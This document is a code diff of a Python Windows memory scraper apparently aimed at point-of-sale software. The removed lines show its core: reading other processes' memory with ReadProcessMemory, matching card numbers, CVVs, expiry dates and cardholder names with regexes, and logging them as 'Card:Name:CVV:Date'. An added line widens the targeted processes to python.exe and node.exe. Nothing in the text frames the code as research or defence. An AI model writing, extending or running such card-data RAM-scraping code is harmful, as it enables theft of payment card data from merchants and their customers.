@@ -1,89 +1,10 @@
-import ctypes
-import psutil
-import re
-import time
-import threading
-import logging
-from queue import Queue
-
-# Constants required for process memory access
-PROCESS_VM_READ = 0x0010
-PROCESS_QUERY_INFORMATION = 0x0400
-
-# Initialize memory queue and running flag
-memory_queue = Queue()
-running = True
-
-# Regex patterns for card information
-CARD_NUMBER_PATTERN = r'\b(?:\d[ -]*?){13,16}\b'  # Example pattern for 13-16 digit card numbers
-CVV_PATTERN = r'\b\d{3,4}\b'  # Typical CVV pattern (3 or 4 digits)
-EXPIRY_DATE_PATTERN = r'\b(0[1-9]|1[0-2])\/([0-9]{2})\b'  # Expiry date pattern (MM/YY)
-NAME_PATTERN = r'[A-Z][a-z]+ [A-Z][a-z]+'  # Simple pattern for detecting names (First Last)
-
-# Function to scan a memory chunk for card info
-def scan_memory_chunk(memory_chunk):
-    valid_cards = []
-    
-    # Search for potential card numbers
-    card_numbers = re.findall(CARD_NUMBER_PATTERN, memory_chunk)
-    
-    for card_number in card_numbers:
-        # Search for associated CVV, Expiry Date, and Name
-        cvv = re.search(CVV_PATTERN, memory_chunk)
-        expiry_date = re.search(EXPIRY_DATE_PATTERN, memory_chunk)
-        name = re.search(NAME_PATTERN, memory_chunk)
-
-        if card_number and cvv and expiry_date and name:
-            card_info = {
-                'Card': card_number,
-                'Name': name.group(),
-                'CVV': cvv.group(),
-                'Date': expiry_date.group()
-            }
-            valid_cards.append(card_info)
-    
-    return valid_cards
-
-# Worker thread that processes memory chunks for a specific process
-def memory_scan_worker(process_handle, pid):
-    while running:
-        if memory_queue.empty():
-            time.sleep(1)  # Avoid busy waiting
-            continue
-        
-        base_addr, size = memory_queue.get()
-        
-        try:
-            buffer = ctypes.create_string_buffer(size)
-            bytesRead = ctypes.c_size_t(0)
-            # Check if the address is still valid and if we can read memory
-            if ctypes.windll.kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(base_addr), buffer, size, ctypes.byref(bytesRead)):
-                print(f"[PID {pid}] Scanning memory region at address {base_addr} with size {size}")
-                valid_cards = scan_memory_chunk(buffer.raw.decode('latin-1', errors='ignore'))
-                if valid_cards:
-                    for card in valid_cards:
-                        # Print in the format "Card:Name:CVV:Date"
-                        formatted_output = f"{card['Card']}:{card['Name']}:{card['CVV']}:{card['Date']}"
-                        print(formatted_output)
-                        logging.info(formatted_output)  # Log to file
-                else:
-                    print(f"[PID {pid}] No valid card data found in this memory region.")
-            else:
-                logging.warning(f"[PID {pid}] Failed to read memory at {base_addr}: Address may not be valid or accessible.")
-                print(f"[PID {pid}] Failed to read memory at address {base_addr}.")
-        except Exception as e:
-            logging.error(f"[PID {pid}] Error reading memory at {base_addr}: {e}")
-            print(f"[PID {pid}] Error reading memory at address {base_addr}: {e}")
-        finally:
-            memory_queue.task_done()
-
 # Function to automatically detect PIDs of relevant processes (e.g., javaw.exe)
 def get_relevant_pids():
     relevant_pids = []
     for proc in psutil.process_iter(['pid', 'name']):
         try:
             # Check for processes that might be related to PoS software
-            if proc.info['name'] in ['javaw.exe', 'java.exe']:  # Add other relevant names here if needed
+            if proc.info['name'] in ['javaw.exe', 'java.exe', 'python.exe', 'node.exe']:  # Add other relevant names here if needed
                 print(f"Detected relevant process: {proc.info['name']} (PID: {proc.info['pid']})")
                 relevant_pids.append(proc.info['pid'])
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
@@ -136,10 +57,3 @@ def scan_process_memory(num_threads=4):
             ctypes.windll.kernel32.CloseHandle(process_handle)
 
     print("All memory scans completed.")
-
-# Example usage
-if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO, filename='memory_scan.log', filemode='a', format='%(asctime)s - %(message)s')
-
-    # Start scanning memory for relevant processes
-    scan_process_memory(num_threads=4)
